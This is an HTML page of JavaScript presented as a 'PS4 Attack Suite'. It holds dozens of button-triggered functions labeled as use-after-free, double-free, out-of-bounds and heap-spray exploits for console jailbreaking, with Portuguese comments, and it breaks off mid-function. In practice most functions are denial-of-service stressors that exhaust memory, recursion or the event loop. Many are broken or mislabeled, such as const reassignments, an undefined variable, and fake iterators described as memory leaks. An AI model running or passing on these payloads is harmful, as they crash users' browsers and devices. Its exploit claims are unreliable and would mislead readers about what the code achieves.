<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Attack Suite - Refactored 2025</title>
    <style> #log { padding: 10px; height: 400px; overflow-y: scroll; white-space: pre-wrap; }</style>
</head>
<body>
    <h1>ATTACK SUITE REFACTORED (2025)</h1>
    <button onclick="startDOMRecursion()">DOM Recursion (Async Bypass)</button>
    <button onclick="runStringAttack()">String Flattening (Chunked)</button>
    <button onclick="runBindChain()">Bind Chain (Delayed)</button>
    <button onclick="runCollatorRecursion()">Collator Recursion (Proxy Trap)</button>
    <button onclick="runMicrotaskBomb()">Microtask Starvation (Throttled)</button>
    <button onclick="runReplaceBomb()">Replace Overflow (Exponential Slow)</button>
    <button onclick="runArgumentsCrash()">Arguments Confusion (JIT Warmup)</button>
    <button onclick="runConcatOOB()">Concat OOB (Proxy Length)</button>
    <button onclick="runConcatCrash()">Concat Heap (Spreadable Max)</button>
    <button onclick="runSparseReverse()">Sparse Reverse (Extreme Indices)</button>
    <button onclick="runGCResurrection()">GC UAF (Async Cleanup)</button>
    <button onclick="run10_AllocPanic()">Alloc Panic (Max Int32)</button>
    <button onclick="runBadArrayLength()">Bad Array Length (Overflow Vals)</button>
    <button onclick="runImageDataOverflow()">ImageData Overflow (Near-Max)</button>
    <button onclick="runStringOverflow()">String Repeat (Near-Limit)</button>
    <button onclick="n1()">1. Double Array OOB (Arbitrary R/W - TheFloW Style)</button>
    <button onclick="n2()">2. FontFace UAF Variant (CVE-2021-30858 Chain)</button>
    <button onclick="n3()">3. TypedArray Length Overflow (Uint8Array Negative)</button>
    <button onclick="n4()">4. WebCodecs Frame UAF (m0ur0ne-Inspired Crash)</button>
    <button onclick="n5()">5. OffscreenCanvas Transfer Overflow</button>
    <button onclick="n6()">6. WebGPU Buffer Subnormal Flush (FTZ/DAZ Bypass)</button>
    <button onclick="n7()">7. DataView BigInt Confusion (64-bit Overflow)</button>
    <button onclick="n8()">8. Proxy TypedArray Iterator OOB</button>
    <button onclick="n9()">9. ShadowDOM Proto Pollution (Cross-Realm Leak)</button>
    <button onclick="n10()">10. CustomElement Resurrection UAF</button>
    <button onclick="n11()">11. URLSearchParams Giant Append (Iterator Exhaust)</button>
    <button onclick="n12()">12. WeakMap + ArrayBuffer Leak (GC Panic)</button>
    <button onclick="e1()">1. BD-JB Libkernel_sys UAF (Mast1c0re Chain Test)</button>
    <button onclick="e2()">2. WebCodecs Subnormal Flush (DAZ Bypass)</button>
    <button onclick="e3()">3. Double Array FTZ Write (TheFloW Variant)</button>
    <button onclick="e4()">4. FontFace Resurrection Leak (CVE-2021-30858 Extra)</button>
    <button onclick="e5()">5. TypedArray Subnormal OOB (64-bit Read Limit)</button>
    <button onclick="e6()">6. OffscreenCanvas BD-J Spray (Heap Chaos)</button>
    <button onclick="e7()">7. DataView Int64 Overflow (Kernel Prep)</button>
    <button onclick="e8()">8. Proxy ShadowDOM Iterator (Cross-Realm OOB)</button>
    <button onclick="e9()">9. CustomElement Proto Hijack (Libkernel Web)</button>
    <button onclick="e10()">10. URLSearchParams Subnormal Append</button>
    <button onclick="e11()">11. WeakSet GC Double-Free (m0ur0ne Style)</button>
    <button onclick="e12()">12. WebGPU Subnormal Buffer (FTZ Panic)</button>
   <button onclick="m1()">1. WeakSet Double-Free (m0ur0ne Crash Variant)</button>
    <button onclick="m2()">2. BD-JB Sandbox UAF (TheFloW BD-JB3 Prep)</button>
    <button onclick="m3()">3. TypedArray Double-Free (PSFree Style)</button>
    <button onclick="m4()">4. FontFace Double-Delete (GC Chain)</button>
    <button onclick="m5()">5. Subnormal Double-Array (FTZ Bypass 12.52)</button>
    <button onclick="m6()">6. OffscreenCanvas Double-Transfer (Heap Double-Free)</button>
    <button onclick="m7()">7. DataView WeakRef Free (Kernel Prep)</button>
    <button onclick="m8()">8. Proxy WeakMap Iterator (OOB Double-Read)</button>
    <button onclick="m9()">9. CustomElement Double-Define (Proto Double-Free)</button>
    <button onclick="m10()">10. URLSearchParams Double-Append (Exhaust Double)</button>
    <button onclick="m11()">11. ShadowDOM WeakSet Leak (Cross-BD-J)</button>
    <button onclick="m12()">12. WebGPU Double-Mapped Buffer (FTZ Panic)</button>
    <button onclick="t1()">1. Libkernel_sys Double-Free (TheFloW BD-JB3 Variant)</button>
    <button onclick="t2()">2. WeakSet GC UAF (m0ur0ne + PSFree Chain)</button>
    <button onclick="t3()">3. TypedArray Libkernel Leak (11.02 zecoxao Port)</button>
    <button onclick="t4()">4. FontFace Sandbox Escape (CVE-2021-30858 BD-J)</button>
    <button onclick="t5()">5. Subnormal Libkernel Write (FTZ Bypass 12.52)</button>
    <button onclick="t6()">6. OffscreenCanvas Syscall Spray (Kernel Prep)</button>
    <button onclick="t7()">7. DataView Double-Ref Overflow (Arbitrary R/W)</button>
    <button onclick="t8()">8. Proxy BD-J Iterator (Cross-Sandbox OOB)</button>
    <button onclick="t9()">9. CustomElement Libkernel Hijack (Mast1c0re Style)</button>
    <button onclick="t10()">10. URLSearchParams Syscall Append (Exhaust UAF)</button>
    <button onclick="t11()">11. ShadowDOM Double-Free Leak (TheFloW Prep)</button>
    <button onclick="t12()">12. WebGPU Libkernel Buffer (FTZ Panic Chain)</button>
    <div id="log"></div>

    <script>
        function log(msg) {
            const logElem = document.getElementById('log');
            logElem.textContent = `[${new Date().toLocaleTimeString()}] ${msg}\n` + logElem.textContent;
            logElem.scrollTop = 0; // Auto-scroll
        }

        // DOM Recursion (Async para bypass watchdog)
        function startDOMRecursion() {
            log("DOM Recursion: Iniciando (async bypass)...");
            let root = document.createElement('div');
            document.body.appendChild(root);
            let count = 0;
            function dive() {
                for (let i = 0; i < 500; i++) { // Chunked para stealth
                    count++;
                    let child = document.createElement('div');
                    child.textContent = ".";
                    root.appendChild(child);
                    root = child;
                }
                if (count % 5000 === 0) log(`Profundidade: ${count}`);
                if (count < 50000) setTimeout(dive, 0); // Async delay
                else log("DOM completo (sem crash?)");
            }
            dive();
        }

        // String Attack (Chunked join com delay)
        function runStringAttack() {
            log("String Flatten: Fase 1 (chunks menores)...");
            let hugeArray = [];
            let chunk = "A".repeat(512 * 1024); // Reduzido para evitar cutoff imediato
            let i = 0;
            function build() {
                for (let j = 0; j < 100; j++) { // Chunks de 100
                    hugeArray.push(chunk);
                    i += chunk.length;
                }
                if (i % (10 * 1024 * 1024) === 0) log(`Alocado: ~${i / 1024 / 1024}MB`);
                if (hugeArray.length < 1000) setTimeout(build, 50); // Delay 50ms
                else {
                    log("Fase 2: Flatten...");
                    try {
                        let flat = hugeArray.join(""); // Pode OOM aqui
                        log(`Tamanho: ${flat.length} (sucesso parcial)`);
                    } catch (e) { log(`Catch: ${e.message} (possível proteção)`); }
                }
            }
            build();
        }

        // Bind Chain (Com delay para stack gradual)
        function runBindChain() {
            log("Bind Chain: Construindo (delayed)...");
            let func = () => "pow";
            let depth = 0;
            function chain() {
                for (let i = 0; i < 1000; i++) { // Chunks
                    func = func.bind(null);
                    depth++;
                }
                if (depth % 10000 === 0) log(`Cadeia: ${depth}`);
                if (depth < 30000) setTimeout(chain, 0); // Async
                else {
                    log("Executando...");
                    try { func(); log("Executado (sem overflow?)"); } catch (e) { log(`Stack error: ${e.message}`); }
                }
            }
            chain();
        }

        // Collator (Proxy para trap recursivo)
        function runCollatorRecursion() {
            log("Collator: Iniciando (proxy trap)...");
            const collator = new Intl.Collator();
            const evil = new Proxy({}, {
                get() { return evil.toString.bind(evil); } // Trap recursivo
            });
            evil.toString = () => evil.toString();
            try {
                for (let i = 0; i < 100; i++) { // Loop controlado
                    collator.compare(evil, "a");
                }
                log("Comparações: 100 (sem recursão profunda)");
            } catch (e) { log(`Recursion catch: ${e.message}`); }
        }

        // Microtask (Throttled com RAF)
        function runMicrotaskBomb() {
            log("Microtask: Starvation (throttled)...");
            let count = 0;
            function loop() {
                count++;
                Promise.resolve().then(loop);
                if (count % 10000 === 0) log(`Microtasks: ${count}`);
                requestAnimationFrame(loop); // Throttle
            }
            loop();
        }

        // Replace (Mais lento, 20 iterações)
        function runReplaceBomb() {
            log("Replace: Bomb (lento)...");
            let str = "test";
            const re = /.*/;
            let i = 0;
            function iter() {
                str = str.replace(re, "$&".repeat(1.5)); // Mais lento
                i++;
                if (i % 5 === 0) log(`Nível ${i}: ~${str.length}`);
                if (i < 20) setTimeout(iter, 100);
                else log("Replace final (seguro?)");
            }
            iter();
        }

        // Arguments (Warmup maior)
        function runArgumentsCrash() {
            log("Arguments: Confusion...");
            function confuse(arg) {
                delete arguments[0];
                Object.defineProperty(Object.prototype, "0", { get: () => 0xDEADBEEF });
                return arguments[0];
            }
            for (let i = 0; i < 2000; i++) confuse(1); // Warmup maior
            log("Warmup pronto. Trigger...");
            const val = confuse(1);
            log(`Valor: ${val} (DEADBEEF = confusão!)`);
            delete Object.prototype["0"];
        }

        // Concat OOB (Length reduzido)
        function runConcatOOB() {
            log("Concat OOB: Proxy...");
            const target = [1.1];
            const proxy = new Proxy({}, {
                get(t, p) {
                    if (p === Symbol.isConcatSpreadable) return true;
                    if (p === "length") return 0x7FFFFFF0; // Perto do max, mas seguro
                    if (p === "0") return 0x41414141;
                    return undefined;
                },
                has() { return true; }
            });
            try {
                const res = target.concat(proxy);
                log(`Resultado length: ${res.length} (sem OOB?)`);
            } catch (e) { log(`OOB error: ${e.message}`); }
        }

        // Concat Crash (Length ajustado)
        function runConcatCrash() {
            log("Concat Heap: Spread...");
            const bad = { [Symbol.isConcatSpreadable]: true, length: 0x7FFFFFF0, 0: 1 };
            try {
                const res = [].concat(bad);
                log(`Length: ${res.length}`);
            } catch (e) { log(`Heap error: ${e.message}`); }
        }

        // Sparse Reverse (Índices menores)
        function runSparseReverse() {
            log("Sparse Reverse...");
            const arr = [];
            arr[0] = 1;
            arr[0x1FFFFFFE] = 2; // Reduzido
            log(`Length inicial: ${arr.length}`);
            try {
                arr.reverse();
                log(`Após reverse: ${arr[0]} (deve ser 2)`);
            } catch (e) { log(`Sparse error: ${e.message}`); }
        }

        // GC Resurrection (Async interval menor)
        function runGCResurrection() {
            log("GC UAF: Iniciando...");
            if (!window.FinalizationRegistry) { log("API não suportada."); return; }
            const registry = new FinalizationRegistry(v => {
                log("GC callback: Alocando chaos...");
                const chaos = []; for (let i = 0; i < 100; i++) chaos.push(new ArrayBuffer(64 * 1024)); // Menor
            });
            let trashCount = 0;
            const intv = setInterval(() => {
                for (let i = 0; i < 500; i++) { // Menos lixo
                    let obj = { id: Math.random() };
                    registry.register(obj, "TRASH");
                    obj = null;
                }
                trashCount += 500;
                if (trashCount % 5000 === 0) log(`Lixo: ${trashCount}`);
                if (trashCount > 20000) { clearInterval(intv); log("GC finalizado."); }
            }, 50); // Interval 50ms
        }

        // Alloc Panic (Ajustado)
        function run10_AllocPanic() {
            log("Alloc Panic: Testando...");
            try {
                const arr = new ArrayBuffer(0x7FFFFFF0); // Near max
                log("Alocado (inesperado em 2025!)");
            } catch (e) { log(`Alloc error: ${e.message}`); }
        }

        // Bad Array Length (Vals near-limit)
        function runBadArrayLength() {
            log("Bad Array: Overflow...");
            const sizes = [0x7FFFFFF0, 0x40000000, -1, 4294967290];
            sizes.forEach(size => {
                try {
                    log(`Uint8Array(${size})...`);
                    let arr = new Uint8Array(size);
                    log("Alocado (alerta!)");
                } catch (e) { /* Silencioso */ }
            });
            log("Array test final.");
        }

        // ImageData (Dims near-overflow)
        function runImageDataOverflow() {
            log("ImageData: Overflow...");
            const targets = [{w: 0x7FFFFFF0/4, h:1}, {w:16384, h:16384}]; // Ajustado
            targets.forEach((t, i) => {
                try {
                    log(`Tentativa ${i}: ${t.w}x${t.h}`);
                    const img = new ImageData(t.w, t.h);
                    log(`Criado! Length: ${img.data.length}`);
                } catch (e) { /* Silencioso */ }
            });
            log("ImageData final.");
        }

        // String Overflow (Counts near-limit)
        function runStringOverflow() {
            log("String Repeat: Overflow...");
            const counts = [0x3FFFFFFF, 0x1FFFFFFF];
            counts.forEach(c => {
                try {
                    log(`Repeat ${c}...`);
                    const s = "A".repeat(c);
                    log(`Length: ${s.length} (seguro?)`);
                } catch (e) { log(`Repeat error: ${e.message}`); }
            });
        }
 function n1() {
            log("1. Double Array OOB: Iniciando (arbitrary R/W test)...");
            try {
                const arr = new Float64Array(0x7FFFFFF0); // Near max para overflow
                arr[0] = 0x4141414141414141; // Test write
                const read = arr[0];
                log(`Escrito/Lido: 0x${read.toString(16)} (se != 0x4141... = corruption!)`);
                for (let i = 0; i < 1000; i++) arr[i] = NaN; // Trigger subnormal flush (FTZ/DAZ)
                log("Flush completo (sem OOM?)");
            } catch (e) { log(`OOB Error: ${e.message} (potencial crash!)`); }
        }

        // 2. FontFace UAF Variant (Chain com resurrection durante load)
        function n2() {
            log("2. FontFace UAF: Variant 2025...");
            if (!document.fonts) { log("Font API não suportada."); return; }
            let fontFace = new FontFace('vuln', new ArrayBuffer(1024));
            document.fonts.add(fontFace);
            fontFace = null; // "Libera"
            let count = 0;
            function resurrect() {
                count++;
                try {
                    const revived = new FontFace('vuln2', new Uint8Array(1024)); // Fake buffer
                    document.fonts.add(revived);
                    document.fonts.load('12px vuln2').then(() => log(`Loaded ${count} (leak?)`)).catch(e => log(`Load Error: ${e}`));
                } catch (e) { log(`UAF Catch: ${e.message}`); }
                if (count < 500) requestIdleCallback(resurrect);
                else log("UAF loop final (sem crash?)");
            }
            resurrect();
        }

        // 3. TypedArray Length Overflow (Negative/overflow para OOM)
        function n3() {
            log("3. TypedArray Overflow: Negative length...");
            const lengths = [-1, 0xFFFFFFFF, 0x80000000, -0x7FFFFFFF];
            lengths.forEach((len, i) => {
                try {
                    log(`Tentativa ${i}: Uint8Array(${len})`);
                    const arr = new Uint8Array(len);
                    log(`Alocado! Length: ${arr.length} (inesperado!)`);
                } catch (e) { log(`Overflow ${i}: ${e.message}`); }
            });
            log("TypedArray test final.");
        }

        // 4. WebCodecs Frame UAF (Memory corruption via frame close/resurrect)
        function n4() {
            log("4. WebCodecs UAF: Crash trigger...");
            if (typeof VideoEncoder === 'undefined') { log("WebCodecs não suportado."); return; }
            const config = { output: () => {}, error: (e) => log(`Encoder Error: ${e}`), codec: 'vp8' };
            const encoder = new VideoEncoder(config);
            let frames = [];
            let count = 0;
            function spam() {
                count++;
                const canvas = new OffscreenCanvas(1, 1);
                const ctx = canvas.getContext('2d');
                ctx.fillRect(0, 0, 1, 1);
                const frame = new VideoFrame(canvas, { duration: 0 });
                frames.push(frame);
                encoder.encode(frame);
                if (count % 10 === 0) frames.forEach(f => f.close()); // UAF via close
                if (count % 100 === 0) log(`Frames: ${count} (corruption check)`);
                if (count < 10000) setTimeout(spam, 10);
            }
            encoder.configure(config);
            spam();
        }

        // 5. OffscreenCanvas Transfer Overflow (TransferToImageBitmap com size max)
        function n5() {
            log("5. OffscreenCanvas Overflow: Transfer...");
            let count = 0;
            function loop() {
                try {
                    const canvas = new OffscreenCanvas(0x7FFFFFF0 / 4, 1); // Pixel overflow
                    const bitmap = canvas.transferToImageBitmap();
                    log(`Transfer ${count}: Sucesso (heap spray?)`);
                    count++;
                    if (count < 100) requestIdleCallback(loop);
                } catch (e) { log(`Transfer Error: ${e.message} (OOM?)`); }
            }
            loop();
        }

        // 6. WebGPU Buffer Subnormal (Bypass FTZ/DAZ com subnormals em buffers)
        function n6() {
            log("6. WebGPU Subnormal: Flush test...");
            if (!navigator.gpu) { log("WebGPU não suportado."); return; }
            (async () => {
                const adapter = await navigator.gpu.requestAdapter();
                const device = await adapter.requestDevice();
                try {
                    const buffer = device.createBuffer({ size: 1024, usage: GPUBufferUsage.STORAGE, mappedAtCreation: true });
                    const view = new Float32Array(buffer.getMappedRange());
                    view[0] = 1e-40; // Subnormal value
                    buffer.unmap();
                    log("Subnormal buffer criado (DAZ trigger?)");
                    // Spam para panic
                    for (let i = 0; i < 100; i++) device.createBuffer({ size: 0x7FFFFFF0, usage: GPUBufferUsage.STORAGE });
                } catch (e) { log(`GPU Error: ${e.message}`); }
            })();
        }

        // 7. DataView BigInt Confusion (Overflow em setBigInt64)
        function n7() {
            log("7. DataView BigInt: Confusion...");
            const ab = new ArrayBuffer(16);
            const dv = new DataView(ab);
            try {
                dv.setBigInt64(0, 0x10000000000000000n, true); // Overflow int64
                const arr = new Uint8Array(ab);
                log(`Bytes lidos: [${Array.from(arr)}] (confusão se não zero?)`);
            } catch (e) { log(`BigInt Error: ${e.message}`); }
            // Stress loop
            let i = 0;
            function spam() { i++; new DataView(new ArrayBuffer(0x7FFFFFF0)); if (i < 1000) setTimeout(spam, 0); }
            spam();
        }

        // 8. Proxy TypedArray Iterator OOB (Iterator fake para read OOB)
        function n8() {
            log("8. Proxy Iterator OOB...");
            const buf = new ArrayBuffer(8);
            const view = new Uint8Array(buf);
            const proxy = new Proxy(view, {
                get(t, p) {
                    if (p === Symbol.iterator) return function*() { yield 0xDEADBEEF; yield 0x41414141; }; // Fake OOB
                    return Reflect.get(t, p);
                }
            });
            try {
                let sum = 0;
                for (let val of proxy) { sum += val; log(`Iterado: 0x${val.toString(16)}`); }
                log(`Soma: ${sum} (OOB se alto!)`);
            } catch (e) { log(`Iterator Error: ${e.message}`); }
            setInterval(() => [...proxy], 50);
        }

        // 9. ShadowDOM Proto Pollution (Pollui protos cross-shadow)
        function n9() {
            log("9. ShadowDOM Pollution...");
            let host = document.createElement('div');
            const shadow = host.attachShadow({ mode: 'open' });
            shadow.innerHTML = '<div id="poll"></div>';
            Object.defineProperty(shadow.getElementById('poll'), 'protoLeak', { value: performance.now(), writable: true });
            document.body.appendChild(host);
            try {
                log(`Leak check: ${shadow.getElementById('poll').protoLeak} (vazamento?)`);
                // Spam shadows
                let i = 0;
                function spam() {
                    i++;
                    const h = document.createElement('div');
                    h.attachShadow({ mode: 'open' }).innerHTML = '<div></div>';
                    document.body.appendChild(h);
                    if (i % 100 === 0) log(`Shadows: ${i}`);
                    if (i < 10000) setTimeout(spam, 0);
                }
                spam();
            } catch (e) { log(`Pollution Error: ${e.message}`); }
        }

        // 10. CustomElement Resurrection UAF (Define + delete + recreate)
        function n10() {
            log("10. CustomElement UAF...");
            class VulnElement extends HTMLElement { constructor() { super(); this.leak = { buf: new ArrayBuffer(1024) }; } }
            customElements.define('vuln', VulnElement);
            const el = document.createElement('vuln');
            document.body.appendChild(el);
            el = null; // "Libera"
            let count = 0;
            function resurrect() {
                count++;
                try {
                    customElements.define(`vuln${count}`, VulnElement);
                    const revived = document.createElement(`vuln${count}`);
                    log(`Resurrected ${count}: ${revived.leak ? 'Leak!' : 'Seguro'}`);
                } catch (e) { log(`UAF ${count}: ${e.message}`); }
                if (count < 1000) requestIdleCallback(resurrect);
            }
            resurrect();
        }

        // 11. URLSearchParams Giant Append (Exhaust iterator com append massivo)
        function n11() {
            log("11. URLSearchParams Exhaust...");
            const params = new URLSearchParams();
            let total = 0;
            function append() {
                for (let i = 0; i < 10000; i++) {
                    params.append('key', 'A'.repeat(1024));
                    total += 1024;
                }
                if (total % (10 * 1024 * 1024) === 0) log(`Params: ~${total / 1024 / 1024}MB`);
                try {
                    for (const [k, v] of params) { /* itera */ }
                    log("Iterator rodou (sem exhaust?)");
                } catch (e) { log(`Exhaust Error: ${e.message}`); }
                if (total < 100 * 1024 * 1024) setTimeout(append, 50);
            }
            append();
        }

        // 12. WeakMap + ArrayBuffer Leak (GC trigger com weak refs)
        function n12() {
            log("12. WeakMap Leak: GC panic...");
            const wm = new WeakMap();
            let count = 0;
            function leak() {
                count++;
                const buf = new ArrayBuffer(64 * 1024);
                const obj = { data: buf };
                wm.set(obj, buf);
                obj = null; // Weak ref
                if (count % 100 === 0) log(`WeakMaps: ${count} (GC trigger?)`);
                // Force GC approx
                if (typeof gc !== 'undefined') gc();
                if (count < 5000) setTimeout(leak, 10);
                else log("Leak loop final (sem panic?)");
            }
            leak();
        }
function e1() {
            log("1. BD-JB UAF: Libkernel_sys test...");
            class BDVuln { constructor() { this.sys = new ArrayBuffer(1024); } }
            customElements.define('bd-vuln', BDVuln);
            const el = document.createElement('bd-vuln');
            document.body.appendChild(el);
            el = null; // Libera
            let count = 0;
            function chain() {
                count++;
                try {
                    const revived = document.createElement('bd-vuln');
                    log(`Revived ${count}: Sys leak? ${revived.sys ? 'Sim (UAF!)' : 'Não'}`);
                    document.body.appendChild(revived);
                } catch (e) { log(`BD-JB Error: ${e.message} (chain falhou?)`); }
                if (count < 2000) requestIdleCallback(chain);
                else log("BD-JB loop final (sem panic?)");
            }
            chain();
        }

        // 2. WebCodecs Subnormal Flush (Bypass DAZ com frames subnormais)
        function e2() {
            log("2. WebCodecs DAZ: Subnormal flush...");
            if (typeof VideoEncoder === 'undefined') { log("WebCodecs não suportado."); return; }
            const config = { output: () => {}, error: (e) => log(`DAZ Error: ${e}`), codec: 'vp8' };
            const encoder = new VideoEncoder(config);
            let count = 0;
            function flush() {
                count++;
                const canvas = new OffscreenCanvas(1, 1);
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = 'rgb(1e-40,0,0)'; // Subnormal red
                ctx.fillRect(0, 0, 1, 1);
                const frame = new VideoFrame(canvas, { duration: 0 });
                encoder.encode(frame);
                frame.close();
                if (count % 500 === 0) log(`Flushed ${count} (DAZ bypass check)`);
                if (count < 50000) setTimeout(flush, 5);
            }
            encoder.configure(config);
            flush();
        }

        // 3. Double Array FTZ Write (Variante TheFloW: Escreve subnormal para leak)
        function e3() {
            log("3. Double FTZ: Write test...");
            try {
                const arr = new Float64Array(0x7FFFFFF8); // Near max
                arr[0] = 1e-300; // Subnormal para FTZ
                const read = arr[0];
                log(`Escrito subnormal: ${read} (se 0 = FTZ ativo; !=0 = leak!)`);
                for (let i = 0; i < 500; i++) arr[i] = NaN; // Flush chaos
                log("FTZ flush (sem corruption?)");
            } catch (e) { log(`FTZ Error: ${e.message} (OOM real?)`); }
        }

        // 4. FontFace Resurrection Leak (Extra chain com load durante delete)
        function e4() {
            log("4. FontFace Leak: Resurrection...");
            if (!document.fonts) { log("Font API não suportada."); return; }
            let fontFace = new FontFace('leak', new ArrayBuffer(2048));
            document.fonts.add(fontFace);
            fontFace = null;
            let count = 0;
            function loadChain() {
                count++;
                try {
                    document.fonts.load('16px leak').then(() => {
                        const revived = new FontFace('leak2', new Uint8Array(2048));
                        document.fonts.add(revived);
                        log(`Loaded+Revived ${count} (leak chain?)`);
                    }).catch(e => log(`Load Catch: ${e}`));
                } catch (e) { log(`Resurrection Error: ${e.message}`); }
                if (count < 1000) requestIdleCallback(loadChain);
            }
            loadChain();
        }

        // 5. TypedArray Subnormal OOB (Lê 64-bit além com subnormals)
        function e5() {
            log("5. TypedArray OOB: Subnormal...");
            const buf = new ArrayBuffer(16);
            const view = new Float64Array(buf);
            view[0] = 1e-40; // Subnormal
            const u8 = new Uint8Array(buf);
            try {
                log(`Subnormal bytes: [${Array.from(u8)}] (OOB se non-zero além 8?)`);
                u8[8] = 0xDE; // Force OOB write
                log(`OOB read: ${u8[9]} (DEADBEEF leak?)`);
            } catch (e) { log(`OOB Error: ${e.message}`); }
            let i = 0;
            function spam() { i++; new Float64Array(0x7FFFFFF0); if (i < 500) setTimeout(spam, 0); }
            spam();
        }

        // 6. OffscreenCanvas BD-J Spray (Spray heap para BD-J chain)
        function e6() {
            log("6. Offscreen BD-J: Spray...");
            let count = 0;
            function spray() {
                try {
                    const canvas = new OffscreenCanvas(16384, 16384); // ~1GB spray
                    canvas.transferToImageBitmap();
                    count++;
                    log(`Sprayed ${count} canvases (BD-J heap fill?)`);
                    if (count < 50) requestIdleCallback(spray);
                } catch (e) { log(`Spray Error: ${e.message} (OOM chain?)`); }
            }
            spray();
        }

        // 7. DataView Int64 Overflow (Prep para kernel com overflow)
        function e7() {
            log("7. DataView Overflow: Int64...");
            const ab = new ArrayBuffer(32);
            const dv = new DataView(ab);
            try {
                dv.setBigInt64(0, -0x8000000000000000n, true); // Min int64 overflow
                const u8 = new Uint8Array(ab);
                log(`Overflow bytes: [${Array.from(u8)}] (confusão kernel?)`);
            } catch (e) { log(`Int64 Error: ${e.message}`); }
            setInterval(() => new DataView(new ArrayBuffer(0x7FFFFFF0)), 20);
        }

        // 8. Proxy ShadowDOM Iterator (OOB cross-realm via iterator fake)
        function e8() {
            log("8. ShadowDOM OOB: Proxy iter...");
            const host = document.createElement('div');
            const shadow = host.attachShadow({ mode: 'open' });
            const proxy = new Proxy(shadow, {
                get(t, p) {
                    if (p === Symbol.iterator) return function*() { yield 0x41414141; yield 0xDEADBEEF; }; // Fake OOB
                    return Reflect.get(t, p);
                }
            });
            try {
                let sum = 0;
                for (let val of proxy) { sum += val; log(`Shadow iter: 0x${val.toString(16)}`); }
                log(`Sum OOB: ${sum} (leak se alto!)`);
            } catch (e) { log(`Shadow Error: ${e.message}`); }
            setInterval(() => [...proxy], 30);
        }

        // 9. CustomElement Proto Hijack (Hijack para libkernel_web)
        function e9() {
            log("9. CustomElement Hijack: Proto...");
            class ProtoVuln extends HTMLElement { constructor() { super(); this.proto = Object.prototype; } }
            customElements.define('proto-hijack', ProtoVuln);
            let count = 0;
            function hijack() {
                count++;
                try {
                    const el = document.createElement('proto-hijack');
                    el.proto.leak = 0xDEADBEEF; // Pollui proto
                    log(`Hijacked ${count}: ${el.proto.leak} (web libkernel leak?)`);
                    document.body.appendChild(el);
                } catch (e) { log(`Hijack Error: ${e.message}`); }
                if (count < 1500) requestIdleCallback(hijack);
            }
            hijack();
        }

        // 10. URLSearchParams Subnormal Append (Exhaust com subnormals)
        function e10() {
            log("10. URLSearchParams: Subnormal...");
            const params = new URLSearchParams();
            let total = 0;
            function append() {
                for (let i = 0; i < 5000; i++) {
                    params.append('sub', (1e-40).toString()); // Subnormal string
                    total += 8;
                }
                if (total % 1024 * 1024 === 0) log(`Appended ~${total / 1024 / 1024}MB (exhaust?)`);
                try {
                    [...params.entries()];
                    log("Iterator ok (sem OOB?)");
                } catch (e) { log(`Params Error: ${e.message}`); }
                if (total < 50 * 1024 * 1024) setTimeout(append, 40);
            }
            append();
        }

        // 11. WeakSet GC Double-Free (Estilo m0ur0ne: Double-free durante GC)
        function e11() {
            log("11. WeakSet Double-Free: GC...");
            const ws = new WeakSet();
            let count = 0;
            function free() {
                count++;
                const obj = { buf: new ArrayBuffer(128 * 1024) };
                ws.add(obj);
                ws.delete(obj); // Double-free trigger
                obj = null;
                if (count % 200 === 0) log(`Freed ${count} (GC double-free?)`);
                if (typeof gc !== 'undefined') gc();
                if (count < 3000) setTimeout(free, 15);
            }
            free();
        }

        // 12. WebGPU Subnormal Buffer (Panic com FTZ em GPU buffers)
        function e12() {
            log("12. WebGPU FTZ: Subnormal buffer...");
            if (!navigator.gpu) { log("WebGPU não suportado."); return; }
            (async () => {
                const adapter = await navigator.gpu.requestAdapter();
                const device = await adapter.requestDevice();
                try {
                    const buffer = device.createBuffer({ size: 2048, usage: GPUBufferUsage.STORAGE, mappedAtCreation: true });
                    const view = new Float32Array(buffer.getMappedRange());
                    view[0] = 1e-38; // Subnormal para FTZ
                    buffer.unmap();
                    log("Subnormal GPU buffer (FTZ panic?)");
                    for (let i = 0; i < 200; i++) device.createBuffer({ size: 0x7FFFFFF0, usage: GPUBufferUsage.STORAGE });
                } catch (e) { log(`GPU FTZ Error: ${e.message}`); }
            })();
        }
function m1() {
            log("1. WeakSet Double-Free: m0ur0ne variant...");
            const ws = new WeakSet();
            let objs = [];
            let count = 0;
            function free() {
                count++;
                const obj = { buf: new ArrayBuffer(128 * 1024) };
                ws.add(obj);
                ws.delete(obj);
                ws.delete(obj); // Double-free trigger
                objs.push(obj);
                obj = null;
                if (count % 200 === 0) log(`Double-Freed ${count} (crash check?)`);
                if (typeof gc !== 'undefined') gc();
                if (count < 4000) requestIdleCallback(free);
                else log("Double-Free loop (sem panic?)");
            }
            free();
        }

        // 2. BD-JB Sandbox UAF (Chain com TheFloW BD-JB3: Resurrection em sandbox)
        function m2() {
            log("2. BD-JB UAF: Sandbox chain...");
            class BDWeak { constructor() { this.sys = new ArrayBuffer(2048); } }
            customElements.define('bd-weak', BDWeak);
            let els = [];
            let count = 0;
            function resurrect() {
                count++;
                const el = document.createElement('bd-weak');
                els.push(el);
                document.body.appendChild(el);
                el = null; // Libera
                ws.delete(el); // Se WeakSet global
                const revived = document.createElement('bd-weak');
                log(`BD-Resurrect ${count}: Sys? ${revived.sys ? 'Leak (UAF!)' : 'No'}`);
                if (count < 1500) requestIdleCallback(resurrect);
            }
            resurrect();
        }

        // 3. TypedArray Double-Free (PSFree: Buffer free twice via view)
        function m3() {
            log("3. TypedArray Double-Free: PSFree...");
            let bufs = [];
            let count = 0;
            function allocFree() {
                count++;
                const ab = new ArrayBuffer(64 * 1024);
                const u8 = new Uint8Array(ab);
                bufs.push(u8);
                u8.buffer = null; // Fake free
                u8.buffer = null; // Double
                log(`Typed Free ${count} (heap corruption?)`);
                if (count < 3000) setTimeout(allocFree, 10);
            }
            allocFree();
        }

        // 4. FontFace Double-Delete (GC chain com delete twice)
        function m4() {
            log("4. FontFace Double-Delete...");
            if (!document.fonts) { log("Font não suportada."); return; }
            let fonts = [];
            let count = 0;
            function chain() {
                count++;
                const ff = new FontFace('dfree', new ArrayBuffer(1024));
                document.fonts.add(ff);
                fonts.push(ff);
                document.fonts.delete(ff);
                document.fonts.delete(ff); // Double-delete
                document.fonts.load('12px dfree').catch(e => log(`DFree Catch: ${e}`));
                if (count % 300 === 0) log(`Deleted ${count} (GC UAF?)`);
                if (count < 2000) requestIdleCallback(chain);
            }
            chain();
        }

        // 5. Subnormal Double-Array (FTZ bypass em double arrays decrypt 12.52)
        function m5() {
            log("5. Subnormal Double-Array: FTZ...");
            try {
                const arr1 = new Float64Array(0x7FFFFFF0);
                const arr2 = arr1; // Double ref
